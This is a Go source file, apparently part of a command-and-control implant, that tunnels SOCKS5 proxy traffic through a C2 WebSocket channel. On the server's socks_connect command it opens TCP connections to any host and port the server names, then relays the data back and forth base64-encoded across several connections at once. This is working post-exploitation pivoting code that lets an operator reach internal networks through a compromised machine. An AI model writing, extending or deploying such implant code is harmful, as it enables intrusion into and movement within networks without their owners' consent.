// socks.go — SOCKS5 proxy relay through C2 channel (multiplexed)
// Supports multiple concurrent SOCKS connections, each identified by conn_id.
// When the server sends a socks_connect command, this module:
// 1. Opens a TCP connection to the target host:port
// 2. Relays data bidirectionally through the C2 WebSocket
// 3. Closes when either side disconnects
//
// Only active in WebSocket transport mode (streaming).
package main

import (
	"encoding/base64"
	"fmt"
	"net"
	"sync"
	"time"
)

// SocksManager holds all active SOCKS relay connections keyed by conn_id
type SocksManager struct {
	relays   map[string]*SocksRelay
	sendFunc func(map[string]interface{}) error
	mu       sync.Mutex
}

// NewSocksManager creates a manager that routes data for multiplexed SOCKS connections
func NewSocksManager(sendFn func(map[string]interface{}) error) *SocksManager {
	return &SocksManager{
		relays:   make(map[string]*SocksRelay),
		sendFunc: sendFn,
	}
}

// SocksRelay manages a single proxied TCP connection
type SocksRelay struct {
	conn   net.Conn
	connID string
	mgr    *SocksManager
	mu     sync.Mutex
	closed bool
}

// Connect opens a new TCP connection for the given conn_id and starts relaying
func (m *SocksManager) Connect(connID, host string, port int) error {
	addrStr := host + ":" + itoa(port)
	conn, err := net.DialTimeout("tcp", addrStr, 15*time.Second)
	if err != nil {
		return err
	}

	relay := &SocksRelay{conn: conn, connID: connID, mgr: m}

	m.mu.Lock()
	if old, ok := m.relays[connID]; ok {
		old.Close()
	}
	m.relays[connID] = relay
	m.mu.Unlock()

	go relay.readLoop()
	return nil
}

// Write sends base64-encoded data from C2 to a specific connection
func (m *SocksManager) Write(connID, b64Data string) error {
	m.mu.Lock()
	relay, ok := m.relays[connID]
	m.mu.Unlock()
	if !ok {
		return fmt.Errorf("unknown conn: %s", connID)
	}
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return err
	}
	_, err = relay.conn.Write(data)
	return err
}

// CloseConn closes a single relay by conn_id and removes it from the map
func (m *SocksManager) CloseConn(connID string) {
	m.mu.Lock()
	if relay, ok := m.relays[connID]; ok {
		relay.Close()
		delete(m.relays, connID)
	}
	m.mu.Unlock()
}

// CloseAll terminates every active relay
func (m *SocksManager) CloseAll() {
	m.mu.Lock()
	defer m.mu.Unlock()
	for id, relay := range m.relays {
		relay.Close()
		delete(m.relays, id)
	}
}

func itoa(i int) string {
	if i == 0 {
		return "0"
	}
	var buf [20]byte
	pos := len(buf)
	neg := i < 0
	if neg {
		i = -i
	}
	for i > 0 {
		pos--
		buf[pos] = byte('0' + i%10)
		i /= 10
	}
	if neg {
		pos--
		buf[pos] = '-'
	}
	return string(buf[pos:])
}

// readLoop reads from the target TCP connection and sends data to C2 tagged with conn_id
func (r *SocksRelay) readLoop() {
	buf := make([]byte, 4096)
	for {
		n, err := r.conn.Read(buf)
		if n > 0 {
			encoded := base64.StdEncoding.EncodeToString(buf[:n])
			msg := map[string]interface{}{
				"type":    "socks_data",
				"conn_id": r.connID,
				"data":    encoded,
			}
			if sendErr := r.mgr.sendFunc(msg); sendErr != nil {
				break
			}
		}
		if err != nil {
			break
		}
	}
	r.mgr.sendFunc(map[string]interface{}{
		"type":    "socks_close",
		"conn_id": r.connID,
	})
	r.Close()
	// Remove self from manager map after loop exits
	r.mgr.mu.Lock()
	if r.mgr.relays[r.connID] == r {
		delete(r.mgr.relays, r.connID)
	}
	r.mgr.mu.Unlock()
}

// Close terminates the relay
func (r *SocksRelay) Close() {
	r.mu.Lock()
	defer r.mu.Unlock()
	if !r.closed {
		r.closed = true
		r.conn.Close()
	}
}

// HandleSocksMessage processes socks-related messages from the C2 server
// Routes by conn_id to the appropriate relay. Returns the active manager.
func HandleSocksMessage(msg map[string]interface{}, mgr *SocksManager,
	sendFn func(map[string]interface{}) error) *SocksManager {

	if mgr == nil {
		mgr = NewSocksManager(sendFn)
	}

	msgType, _ := msg["type"].(string)
	connID, _ := msg["conn_id"].(string)

	switch msgType {
	case "socks_init":
		// Server is setting up SOCKS proxy -- just acknowledge

	case "socks_connect":
		host, _ := msg["host"].(string)
		portFloat, _ := msg["port"].(float64)
		port := int(portFloat)
		if host != "" && port > 0 && connID != "" {
			err := mgr.Connect(connID, host, port)
			if err != nil {
				sendFn(map[string]interface{}{
					"type":    "socks_connect_ack",
					"conn_id": connID,
					"success": false,
					"error":   err.Error(),
				})
			} else {
				sendFn(map[string]interface{}{
					"type":    "socks_connect_ack",
					"conn_id": connID,
					"success": true,
				})
			}
		}

	case "socks_send", "socks_data":
		if connID != "" {
			if data, ok := msg["data"].(string); ok {
				if err := mgr.Write(connID, data); err != nil {
					sendFn(map[string]interface{}{
						"type":    "socks_error",
						"conn_id": connID,
						"error":   err.Error(),
					})
				}
			}
		}
	}

	return mgr
}
